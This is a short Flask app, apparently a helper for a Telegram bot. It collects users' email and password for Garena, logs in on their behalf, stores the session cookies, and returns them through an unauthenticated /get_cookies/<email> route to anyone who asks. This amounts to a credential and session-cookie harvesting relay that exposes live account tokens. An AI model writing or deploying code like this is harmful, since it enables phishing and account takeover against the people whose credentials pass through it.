from flask import Flask, request, jsonify, render_template_string
import requests

app = Flask(__name__)
user_cookies = {}

LOGIN_FORM = '''
<form method="post">
  Email: <input type="text" name="email"/><br/>
  Password: <input type="password" name="password"/><br/>
  <input type="submit" value="Login"/>
</form>
'''

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')

        # Example: simulate login request to Garena (replace with real API)
        login_url = 'https://sso.garena.com/api/login'  # hypothetical API endpoint
        data = {'email': email, 'password': password}

        session = requests.Session()
        response = session.post(login_url, data=data)

        if response.ok:
            # Save cookies for user - in reality, associate with telegram user_id/session
            user_cookies[email] = session.cookies.get_dict()
            return "Login successful, cookies saved. You can now use the bot."
        else:
            return "Login failed."

    return render_template_string(LOGIN_FORM)

@app.route('/get_cookies/<email>')
def get_cookies(email):
    cookies = user_cookies.get(email)
    if cookies:
        return jsonify(cookies)
    return jsonify({"error": "No cookies found"}), 404

if __name__ == '__main__':
    app.run()
